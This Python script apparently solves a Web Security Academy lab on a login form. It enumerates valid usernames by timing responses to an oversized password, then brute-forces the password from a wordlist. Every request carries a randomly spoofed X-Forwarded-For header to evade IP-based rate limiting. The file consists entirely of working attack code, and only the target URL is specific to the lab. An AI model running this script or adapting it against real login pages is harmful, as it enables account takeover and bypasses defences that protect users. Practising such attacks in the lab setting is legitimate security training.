import requests
import random

url = "https://0a6a00d7044da938848192f8004d0026.web-security-academy.net/login"

def random_ip():
    return ".".join(str(random.randint(0, 255)) for _ in range(4))

# Brute-force username
with open("usernames.txt", "r") as f:
    for line in f:
        username = line.strip()
        r = requests.post(url, data={"username": username, "password": "A"*1000}, headers={"X-Forwarded-For": random_ip()})
        if r.elapsed.total_seconds() > 2:
            break
print(username)

# Brute-force password
with open("passwords.txt", "r") as f:
    for line in f:
        password = line.strip()
        r = requests.post(url, data={"username": username, "password": password}, headers={"X-Forwarded-For": random_ip()})
        if "Invalid username or password" not in r.text:
            break
print(password)